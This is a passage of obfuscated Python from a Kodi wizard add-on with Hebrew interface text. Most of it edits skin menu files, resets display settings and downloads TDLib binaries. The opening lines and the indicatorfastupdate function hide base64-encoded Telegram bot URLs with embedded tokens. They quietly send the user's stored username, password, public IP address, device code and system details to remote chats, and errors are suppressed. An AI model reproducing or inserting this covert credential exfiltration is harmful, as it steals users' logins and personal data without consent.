                OOO00O00OOOOOO0O0 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ9').decode ('utf-8')#line:2842
          O00O00OO00OOOOOO0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:2843
          OOO0OO000O00O0000 =O00000O000OO00OOO #line:2845
          OO0000O0O0OO00O0O =O0OOOO0O0O0O0OOOO #line:2846
          OOOOO0000O00O00OO =requests .get (OOO00O00OOOOOO0O0 +que ('התקין: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOO0OO000O00O0000 +que (' סיסמה: ')+OO0000O0O0OO00O0O +que (' קודי: ')+O0OOO0OOO000OOOO0 +que (' כתובת: ')+O00O00OO00OOOOOO0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO00OOO0OOO0O0OO0 +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+O0O00O00O0O00O000 ).json ()#line:2849
       except :pass #line:2850
def indicatorfastupdate (info =''):#line:2852
       try :#line:2853
          import json ,requests #line:2854
          O0O000OO0OOO00O0O =wiz .getS ("date_user")#line:2855
          wiz .log ('FRESH MESSAGE')#line:2856
          OO000000000OO0O00 =(wiz .getS ("user"))#line:2857
          OOO0OOOOOO0OO00OO =(wiz .getS ("pass"))#line:2858
          O0OO0OOO0O00000OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2859
          O0OOOOO0O0000OOO0 =platform .uname ()#line:2860
          O0O0OOOOOOOO0O000 =O0OOOOO0O0000OOO0 [1 ]#line:2861
          if wiz .getS ('dragon')=='true':#line:2863
            OO0000OO0O00O0OOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU4MDUzMzM1NzpBQUVzTjZPLU5QN05IU1B0eHc2UTZpVnVEa2dhZU1aUU1nOC9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTcwNzQ3MjI0JnRleHQ9').decode ('utf-8')#line:2864
          else :#line:2865
            OO0000OO0O00O0OOO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode ('utf-8')#line:2866
          OOO0OO00O0OO00O0O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:2867
          O0O00OOOOOO0O0O00 =OO000000000OO0O00 #line:2869
          OOO0OOO0O00000OO0 =OOO0OOOOOO0OO00OO #line:2870
          OO0OOOOOO0OO0O0OO =requests .get (OO0000OO0O00O0OOO +que ('עדכון מהיר ')+que (info )+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0O00OOOOOO0O0O00 +que (' סיסמה: ')+OOO0OOO0O00000OO0 +que (' קודי: ')+O0OO0OOO0O00000OO +que (' כתובת: ')+OOO0OO00O0OO00O0O +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O0O0OOOOOOOO0O000 +que (' גירסת ויזארד: ')+VERSION +que (' מנוי: ')+O0O000OO0OOO00O0O ).json ()#line:2873
       except :pass #line:2876
def skin_homeselect ():#line:2883
    OOOO0O0OO000OOO0O =os .path .join (translatepath ("special://masterprofile/"),"addon_data","skin.Premium.mod","settings.xml")#line:2884
    OOO000O0OO000O0O0 =open (OOOO0O0OO000OOO0O ,'r',encoding ='utf-8')#line:2886
    OO0OOOO00OO00O0O0 =OOO000O0OO000O0O0 .read ()#line:2887
    OOO000O0OO000O0O0 .close ()#line:2888
    try :#line:2889
        OOO00OO000OO000OO ='<setting id="FirstRunSetup" type="bool">(.+?)</setting>'#line:2890
        O0000OOOOO0O00OOO =re .compile (OOO00OO000OO000OO ).findall (OO0OOOO00OO00O0O0 )[0 ]#line:2891
        OOO000O0OO000O0O0 =open (OOOO0O0OO000OOO0O ,'w',encoding ='utf-8')#line:2892
        OOO000O0OO000O0O0 .write (OO0OOOO00OO00O0O0 .replace ('<setting id="FirstRunSetup" type="bool">%s</setting>'%O0000OOOOO0O00OOO ,'<setting id="FirstRunSetup" type="bool">false</setting>'))#line:2893
        OOO000O0OO000O0O0 .close ()#line:2894
    except :pass #line:2895
def download_file (OO0000O00O00O0O0O ,OO000O0000O00O0OO ):#line:2896
    import requests #line:2910
    O0OO0O00OO0O0000O =xbmcgui .DialogProgress ()#line:2911
    O0OOO0OO000000000 =OO0000O00O00O0O0O .split ('/')[-1 ]#line:2913
    if '?'in O0OOO0OO000000000 :#line:2914
        O0OOO0OO000000000 =O0OOO0OO000000000 .split ('?')[0 ]#line:2915
    O0OOO0OO000000000 =os .path .join (OO000O0000O00O0OO ,O0OOO0OO000000000 )#line:2916
    O0OO0O00OO0O0000O .create ("Downloading","[COLOR yellow][B]TeleFiles[/B][/COLOR]")#line:2918
    with requests .get (OO0000O00O00O0O0O ,stream =True )as OOO0O000O0OO000OO :#line:2919
        OOO0O000O0OO000OO .raise_for_status ()#line:2920
        with open (O0OOO0OO000000000 ,'wb')as O0OOOOO000O00OOO0 :#line:2922
            OO00O00OO0OOO0O00 =1 #line:2923
            OO0OOO000OO0OOOOO =time .time ()#line:2924
            for OO00000O0OOO0O0OO in OOO0O000O0OO000OO .iter_content (chunk_size =8192 ):#line:2926
                OO00O00OO0OOO0O00 +=1 #line:2928
                O0OO0O00OO0O0000O .update (int (OO00O00OO0OOO0O00 ),"Downloading "+'TeleFiles')#line:2929
                if O0OO0O00OO0O0000O .iscanceled ():#line:2930
                 O0OO0O00OO0O0000O .close ()#line:2931
                 break #line:2932
                O0OOOOO000O00OOO0 .write (OO00000O0OOO0O0OO )#line:2933
    return O0OOO0OO000000000 #line:2934
def tdlib ():#line:2935
    import requests #line:2937
    import platform #line:2938
    OOOOO0O000OO0000O =(platform .machine ())#line:2939
    platform =(platform .architecture ())#line:2940
    if sys .platform .lower ().startswith ('linux'):#line:2941
        O0O0O0OOO0O0OOO0O ='linux'#line:2942
        if 'ANDROID_DATA'in os .environ :#line:2943
            O0O0O0OOO0O0OOO0O ='android'#line:2944
    elif sys .platform .lower ().startswith ('win'):#line:2945
        O0O0O0OOO0O0OOO0O ='windows'#line:2946
    elif sys .platform .lower ().startswith ('darwin'):#line:2947
        O0O0O0OOO0O0OOO0O ='darwin'#line:2948
    else :#line:2949
        O0O0O0OOO0O0OOO0O =None #line:2950
    from zipfile import ZipFile #line:2951
    OOOO0O0O0O0OOO000 =os .path .join (translatepath ("special://home/"),"addons","plugin.video.telemedia")#line:2953
    OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,'resources','lib')#line:2954
    O00O0OO000O00O0O0 =requests .get ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json').json ()#line:2955
    OO0OOOO00O00000OO =xbmcvfs .translatePath (ADDON .getAddonInfo ("profile"))#line:2957
    download_file ('https://raw.githubusercontent.com/vip200/TelemdiaTdlib/main/data.json',OO0OOOO00O00000OO )#line:2959
    if O0O0O0OOO0O0OOO0O =='android':#line:2960
            if platform [0 ]=='32bit':#line:2961
                O00OO00O00OOOO0OO =O00O0OO000O00O0O0 ['android32']#line:2962
                OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,"android/armeabi-v7a")#line:2963
                download_file (O00OO00O00OOOO0OO ,OOOO0O0O0O0OOO000 )#line:2964
            else :#line:2965
                O00OO00O00OOOO0OO =O00O0OO000O00O0O0 ['android64']#line:2966
                OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,"android/arm64-v8a")#line:2967
                download_file (O00OO00O00OOOO0OO ,OOOO0O0O0O0OOO000 )#line:2968
    elif O0O0O0OOO0O0OOO0O =='windows':#line:2970
        if platform [0 ]=='64bit':#line:2972
            OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,'windows/x64')#line:2974
            download_file (O00O0OO000O00O0O0 ['windows64'],OOOO0O0O0O0OOO000 )#line:2975
            OO000OO0O000OO0OO =os .path .join (OOOO0O0O0O0OOO000 ,'windows64.zip')#line:2976
            OOO0O0000000OO000 =ZipFile (OO000OO0O000OO0OO )#line:2977
            for OO0O0O0OOOOO00O00 in OOO0O0000000OO000 .infolist ():#line:2981
                OOO0O0000000OO000 .extract (member =OO0O0O0OOOOO00O00 ,path =OOOO0O0O0O0OOO000 )#line:2982
            OOO0O0000000OO000 .close ()#line:2983
            time .sleep (1 )#line:2984
            try :#line:2985
                os .remove (OO000OO0O000OO0OO )#line:2986
            except :#line:2987
                pass #line:2988
        else :#line:2989
            OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,'windows/x32')#line:2991
            download_file (O00O0OO000O00O0O0 ['windows32'],OOOO0O0O0O0OOO000 )#line:2992
            OO000OO0O000OO0OO =os .path .join (OOOO0O0O0O0OOO000 ,'windows32.zip')#line:2993
            OOO0O0000000OO000 =ZipFile (OO000OO0O000OO0OO )#line:2994
            for OO0O0O0OOOOO00O00 in OOO0O0000000OO000 .infolist ():#line:2998
                OOO0O0000000OO000 .extract (member =OO0O0O0OOOOO00O00 ,path =OOOO0O0O0O0OOO000 )#line:2999
            OOO0O0000000OO000 .close ()#line:3000
            time .sleep (1 )#line:3001
            try :#line:3002
                os .remove (OO000OO0O000OO0OO )#line:3003
            except :#line:3004
                pass #line:3005
    elif O0O0O0OOO0O0OOO0O =='linux':#line:3006
            if platform [0 ]=='32bit':#line:3008
                O00OO00O00OOOO0OO =O00O0OO000O00O0O0 ['linux32']#line:3009
                OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,"linux/x32")#line:3010
                download_file (O00OO00O00OOOO0OO ,OOOO0O0O0O0OOO000 )#line:3011
            else :#line:3012
                O00OO00O00OOOO0OO =O00O0OO000O00O0O0 ['linux64']#line:3013
                OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,"linux/x64")#line:3014
                download_file (O00OO00O00OOOO0OO ,OOOO0O0O0O0OOO000 )#line:3015
    elif O0O0O0OOO0O0OOO0O =='darwin':#line:3018
                OOOO0O0O0O0OOO000 =os .path .join (OOOO0O0O0O0OOO000 ,'mac/mac-os')#line:3019
                download_file (O00O0OO000O00O0O0 ['mac'],OOOO0O0O0O0OOO000 )#line:3020
                OO00OOOO00O0000OO =os .path .join (OOOO0O0O0O0OOO000 ,'libtdjson.zip')#line:3021
                OOO0O0000000OO000 =ZipFile (OO00OOOO00O0000OO )#line:3022
                for OO0O0O0OOOOO00O00 in OOO0O0000000OO000 .infolist ():#line:3023
                    OOO0O0000000OO000 .extract (member =OO0O0O0OOOOO00O00 ,path =OOOO0O0O0O0OOO000 )#line:3024
                OOO0O0000000OO000 .close ()#line:3025
                time .sleep (1 )#line:3026
                try :#line:3027
                    os .remove (OO00OOOO00O0000OO )#line:3028
                except :#line:3029
                    pass #line:3030
def open_dragon_menu_hub ():#line:3033
        O0OOOOO00OOOO0000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","mainmenu.DATA.xml")#line:3034
        O00O0O0OOOOOO0OO0 =open (O0OOOOO00OOOO0000 ,'r',encoding ='utf-8')#line:3036
        OOO000O0000O0O000 =O00O0O0OOOOOO0OO0 .read ()#line:3037
        O00O0O0OOOOOO0OO0 .close ()#line:3038
        OOO000O0000O0O000 =OOO000O0000O0O000 .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		</shortcut>''')#line:3055
        O00O0O0OOOOOO0OO0 =open (O0OOOOO00OOOO0000 ,'w',encoding ='utf-8')#line:3056
        O00O0O0OOOOOO0OO0 .write (OOO000O0000O0O000 )#line:3057
        O00O0O0OOOOOO0OO0 .close ()#line:3058
def close_dragon_menu_hub ():#line:3059
        OO0OOO000000OOO0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","mainmenu.DATA.xml")#line:3060
        O0O000OO00O0O0OOO =open (OO0OOO000000OOO0O ,'r',encoding ='utf-8')#line:3062
        O00O00O0O000O00OO =O0O000OO00O0O0OOO .read ()#line:3063
        O0O000OO00O0O0OOO .close ()#line:3064
        O00O00O0O000O00OO =O00O00O0O000O00OO .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>[B] טורקיות [/B]</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://home/Graphics/dragon.jpg</thumb>
		<action>ActivateWindow(1124)</action>
		<disabled>True</disabled>
		</shortcut>''')#line:3081
        O0O000OO00O0O0OOO =open (OO0OOO000000OOO0O ,'w',encoding ='utf-8')#line:3082
        O0O000OO00O0O0OOO .write (O00O00O0O000O00OO )#line:3083
        O0O000OO00O0O0OOO .close ()#line:3084
def dragon_menu_hub_old ():#line:3086
        O000O00000OO0O0OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3088
        O00OO0OOO0O0OO0O0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3089
        OOOOO0O0O0OO0OO00 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1102.DATA.xml")#line:3090
        O0O0OO00OOOO0OO0O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:3091
        OO00OOOOO00000OOO =open (O000O00000OO0O0OO ,'r',encoding ='utf-8')#line:3095
        OOO00OOO0OOO0OO0O =OO00OOOOO00000OOO .read ()#line:3096
        OO00OOOOO00000OOO .close ()#line:3097
        OO00OOOOO00000OOO =open (O00OO0OOO0O0OO0O0 ,'r',encoding ='utf-8')#line:3099
        OOO00OOO0OOO0OO0O =OO00OOOOO00000OOO .read ()#line:3100
        OO00OOOOO00000OOO .close ()#line:3101
        OO00OOOOO00000OOO =open (OOOOO0O0O0OO0OO00 ,'r',encoding ='utf-8')#line:3103
        OOO00OO0OOO0000O0 =OO00OOOOO00000OOO .read ()#line:3104
        OO00OOOOO00000OOO .close ()#line:3105
        OO00OOOOO00000OOO =open (O0O0OO00OOOO0OO0O ,'r',encoding ='utf-8')#line:3107
        OOO00OO0OOO0000O0 =OO00OOOOO00000OOO .read ()#line:3108
        OO00OOOOO00000OOO .close ()#line:3109
        OOO00OOO0OOO0OO0O =OOO00OOO0OOO0OO0O .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סרטים Dragon</label>
		<label2>Hub 21</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1121)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סרטים Dragon</label>
		<label2>Hub 21</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1121)</action>
		</shortcut>''')#line:3128
        OOO00OO0OOO0000O0 =OOO00OO0OOO0000O0 .replace ('''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סדרות Dragon</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1124)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID>31123</defaultID>
		<label>סדרות Dragon</label>
		<label2>Hub 24</label2>
		<icon>special://skin/extras/icons/addon.png</icon>
		<thumb>special://skin/extras/icons/dragon.png</thumb>
		<action>ActivateWindow(1124)</action>
		</shortcut>''')#line:3144
        OO00OOOOO00000OOO =open (O000O00000OO0O0OO ,'w',encoding ='utf-8')#line:3146
        OO00OOOOO00000OOO .write (OOO00OOO0OOO0OO0O )#line:3147
        OO00OOOOO00000OOO .close ()#line:3148
        OO00OOOOO00000OOO =open (O00OO0OOO0O0OO0O0 ,'w',encoding ='utf-8')#line:3150
        OO00OOOOO00000OOO .write (OOO00OOO0OOO0OO0O )#line:3151
        OO00OOOOO00000OOO .close ()#line:3152
        OO00OOOOO00000OOO =open (OOOOO0O0O0OO0OO00 ,'w',encoding ='utf-8')#line:3154
        OO00OOOOO00000OOO .write (OOO00OO0OOO0000O0 )#line:3155
        OO00OOOOO00000OOO .close ()#line:3156
        OO00OOOOO00000OOO =open (O0O0OO00OOOO0OO0O ,'w',encoding ='utf-8')#line:3158
        OO00OOOOO00000OOO .write (OOO00OO0OOO0000O0 )#line:3159
        OO00OOOOO00000OOO .close ()#line:3160
def sex_menu_luck (notify =''):#line:3161
        if notify =='true':#line:3162
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]מוסתר[/COLOR]"%COLOR2 )#line:3163
        wiz .setS ('sex','false')#line:3164
        OO000O0000O0O0OO0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3165
        O0OOO0OO0OOOO00O0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3166
        O0O00OOO0O0000O00 =open (OO000O0000O0O0OO0 ,'r',encoding ='utf-8')#line:3168
        O000000O0O0O00000 =O0O00OOO0O0000O00 .read ()#line:3169
        O0O00OOO0O0000O00 .close ()#line:3170
        O0O00OOO0O0000O00 =open (O0OOO0OO0OOOO00O0 ,'r',encoding ='utf-8')#line:3172
        O000000O0O0O00000 =O0O00OOO0O0000O00 .read ()#line:3173
        O0O00OOO0O0000O00 .close ()#line:3174
        O000000O0O0O00000 =O000000O0O0O00000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		<disabled>True</disabled>
		</shortcut>''')#line:3192
        O0O00OOO0O0000O00 =open (OO000O0000O0O0OO0 ,'w',encoding ='utf-8')#line:3194
        O0O00OOO0O0000O00 .write (O000000O0O0O00000 )#line:3195
        O0O00OOO0O0000O00 .close ()#line:3196
        O0O00OOO0O0000O00 =open (O0OOO0OO0OOOO00O0 ,'w',encoding ='utf-8')#line:3198
        O0O00OOO0O0000O00 .write (O000000O0O0O00000 )#line:3199
        O0O00OOO0O0000O00 .close ()#line:3200
def sex_menu_open ():#line:3202
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]הופעל[/COLOR]"%COLOR2 )#line:3204
        wiz .setS ('sex','true')#line:3205
        OOOO0O0O0O0OO00O0 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","x1101.DATA.xml")#line:3206
        O000O00O0OO0O000O =os .path .join (translatepath ("special://home/"),"userdata","addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:3207
        OOO000O00OO0OOO0O =open (OOOO0O0O0O0OO00O0 ,'r',encoding ='utf-8')#line:3209
        O0000O0O0OOO000O0 =OOO000O00OO0OOO0O .read ()#line:3210
        OOO000O00OO0OOO0O .close ()#line:3211
        OOO000O00OO0OOO0O =open (O000O00O0OO0O000O ,'r',encoding ='utf-8')#line:3213
        O0000O0O0OOO000O0 =OOO000O00OO0OOO0O .read ()#line:3214
        OOO000O00OO0OOO0O .close ()#line:3215
        O0000O0O0OOO000O0 =O0000O0O0OOO000O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		<disabled>True</disabled>
		</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים למבוגרים</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/purn.png</thumb>
		<action>RunPlugin(plugin://plugin.program.Settingz-Anon/?mode=290&amp;url=www)</action>
		</shortcut>''')#line:3232
        OOO000O00OO0OOO0O =open (OOOO0O0O0O0OO00O0 ,'w',encoding ='utf-8')#line:3234
        OOO000O00OO0OOO0O .write (O0000O0O0OOO000O0 )#line:3235
        OOO000O00OO0OOO0O .close ()#line:3236
        OOO000O00OO0OOO0O =open (O000O00O0OO0O000O ,'w',encoding ='utf-8')#line:3238
        OOO000O00OO0OOO0O .write (O0000O0O0OOO000O0 )#line:3239
        OOO000O00OO0OOO0O .close ()#line:3240
def fix_gui ():#line:3244
        O000OO00O0O00OOO0 =os .path .join (translatepath ("special://userdata"),"guisettings.xml")#line:3246
        OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'r',encoding ='utf-8')#line:3247
        OO000O0OO0OO00O0O =OO00OO0O0O0OOO00O .read ()#line:3248
        OO00OO0O0O0OOO00O .close ()#line:3249
        try :#line:3252
            OO0O0000O0OO0OOO0 ='<setting id="window.width">(.+?)</setting>'#line:3253
            O0O00000OO00OO00O =re .compile (OO0O0000O0OO0OOO0 ).findall (OO000O0OO0OO00O0O )[0 ]#line:3254
            OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'w',encoding ='utf-8')#line:3255
            OO00OO0O0O0OOO00O .write (OO000O0OO0OO00O0O .replace ('<setting id="window.width">%s</setting>'%O0O00000OO00OO00O ,'<setting id="window.width" default="true">720</setting>'))#line:3256
            OO00OO0O0O0OOO00O .close ()#line:3257
        except :pass #line:3258
        OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'r',encoding ='utf-8')#line:3260
        OOOOOO00O00OO0O0O =OO00OO0O0O0OOO00O .read ()#line:3261
        OO00OO0O0O0OOO00O .close ()#line:3262
        try :#line:3263
            OO0OO00O00O0O000O ='<setting id="window.height">(.+?)</setting>'#line:3264
            O0O000O0OOOO0OOO0 =re .compile (OO0OO00O00O0O000O ).findall (OOOOOO00O00OO0O0O )[0 ]#line:3265
            OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'w',encoding ='utf-8')#line:3266
            OO00OO0O0O0OOO00O .write (OOOOOO00O00OO0O0O .replace ('<setting id="window.height">%s</setting>'%O0O000O0OOOO0OOO0 ,'<setting id="window.height" default="true">480</setting>'))#line:3267
            OO00OO0O0O0OOO00O .close ()#line:3268
        except :pass #line:3269
        OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'r',encoding ='utf-8')#line:3272
        O00OOOOO0O0OOOO00 =OO00OO0O0O0OOO00O .read ()#line:3273
        OO00OO0O0O0OOO00O .close ()#line:3274
        try :#line:3275
            O00O00OO00O000O00 ='<setting id="videoscreen.screen">(.+?)</setting>'#line:3276
            O00O0O000OO0O0O0O =re .compile (O00O00OO00O000O00 ).findall (O00OOOOO0O0OOOO00 )[0 ]#line:3277
            OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'w',encoding ='utf-8')#line:3278
            OO00OO0O0O0OOO00O .write (O00OOOOO0O0OOOO00 .replace ('<setting id="videoscreen.screen">%s</setting>'%O00O0O000OO0O0O0O ,'<setting id="videoscreen.screen" default="true">0</setting>'))#line:3279
            OO00OO0O0O0OOO00O .close ()#line:3280
        except :pass #line:3281
        OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'r',encoding ='utf-8')#line:3283
        OOO0O0O0OOO00000O =OO00OO0O0O0OOO00O .read ()#line:3284
        OO00OO0O0O0OOO00O .close ()#line:3285
        try :#line:3286
            OOOOO00OO00OOOO0O ='<setting id="videoscreen.screenmode">(.+?)</setting>'#line:3287
            OOOO00000O000O00O =re .compile (OOOOO00OO00OOOO0O ).findall (OOO0O0O0OOO00000O )[0 ]#line:3288
            OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'w',encoding ='utf-8')#line:3289
            OO00OO0O0O0OOO00O .write (OOO0O0O0OOO00000O .replace ('<setting id="videoscreen.screenmode">%s</setting>'%OOOO00000O000O00O ,'<setting id="videoscreen.screenmode" default="true">DESKTOP</setting>'))#line:3290
            OO00OO0O0O0OOO00O .close ()#line:3291
        except :pass #line:3292
        OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'r',encoding ='utf-8')#line:3294
        O0000000O0O00O00O =OO00OO0O0O0OOO00O .read ()#line:3295
        OO00OO0O0O0OOO00O .close ()#line:3296
        try :#line:3297
            O00000O00OO00OO0O ='<setting id="videoscreen.resolution">(.+?)</setting>'#line:3298
            OOOOO0OO00O0OOOO0 =re .compile (O00000O00OO00OO0O ).findall (O0000000O0O00O00O )[0 ]#line:3299
            OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'w',encoding ='utf-8')#line:3300
            OO00OO0O0O0OOO00O .write (O0000000O0O00O00O .replace ('<setting id="videoscreen.resolution">%s</setting>'%OOOOO0OO00O0OOOO0 ,'<setting id="videoscreen.resolution">60</setting>'))#line:3301
            OO00OO0O0O0OOO00O .close ()#line:3302
        except :pass #line:3303
        OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'r',encoding ='utf-8')#line:3305
        OOO000O00O00O00O0 =OO00OO0O0O0OOO00O .read ()#line:3306
        OO00OO0O0O0OOO00O .close ()#line:3307
        try :#line:3308
            OOO0O0OO0OOOO00OO ='<setting id="audiooutput.audiodevice">(.+?)</setting>'#line:3309
            OO0OO000000O0OOOO =re .compile (OOO0O0OO0OOOO00OO ).findall (OOO000O00O00O00O0 )[0 ]#line:3310
            OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'w',encoding ='utf-8')#line:3311
            OO00OO0O0O0OOO00O .write (OOO000O00O00O00O0 .replace ('<setting id="audiooutput.audiodevice">%s</setting>'%OO0OO000000O0OOOO ,'<setting id="audiooutput.audiodevice" default="true">DIRECTSOUND:default</setting>'))#line:3312
            OO00OO0O0O0OOO00O .close ()#line:3313
        except :pass #line:3314
        OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'r',encoding ='utf-8')#line:3317
        O000000O00OO0OOOO =OO00OO0O0O0OOO00O .read ()#line:3318
        OO00OO0O0O0OOO00O .close ()#line:3319
        try :#line:3320
            O0O0O000000OO00OO ='<setting id="audiooutput.passthroughdevice">(.+?)</setting>'#line:3321
            O0OOO00OO000O0O0O =re .compile (O0O0O000000OO00OO ).findall (O000000O00OO0OOOO )[0 ]#line:3322
            OO00OO0O0O0OOO00O =open (O000OO00O0O00OOO0 ,'w',encoding ='utf-8')#line:3323
            OO00OO0O0O0OOO00O .write (O000000O00OO0OOOO .replace ('<setting id="audiooutput.passthroughdevice">%s</setting>'%O0OOO00OO000O0O0O ,'<setting id="audiooutput.passthroughdevice" default="true">DIRECTSOUND:default</setting>'))#line:3324
            OO00OO0O0O0OOO00O .close ()#line:3325
        except :pass #line:3326
def get_link (O00O0O0OOOOOOOOO0 ):#line:3331
    O0OOOOO00OOOOO0O0 =time .time ()+120 #line:3333
    while (O00O0O0OOOOOOOOO0 =='empty'or O00O0O0OOOOOOOOO0 ==None ):#line:3334
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Anonymous TV'),'[COLOR %s]המתן לאישור התקנה על ידי - Anonymous[/COLOR]'%COLOR2 )#line:3335
          O00O0O0OOOOOOOOO0 =readcode ()#line:3337
          if time .time ()>O0OOOOO00OOOOO0O0 :#line:3338
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3340
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אין מענה[/COLOR]'%COLOR2 )#line:3341
            sys .exit ()#line:3342
            break #line:3343
    return O00O0O0OOOOOOOOO0 #line:3344
def sync_rd ():#line:3345
    O0O0OOO000O0O0O0O =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:3346
    OO0OO0O0OOOOO000O =wiz .getS ('rd_user')#line:3347
    O0O0OOOO0OOOO0OOO =wiz .getS ('rd_pass')#line:3348
    O0O0OOO000O0O0O0O .setSetting ('auto_rd','true')#line:3350
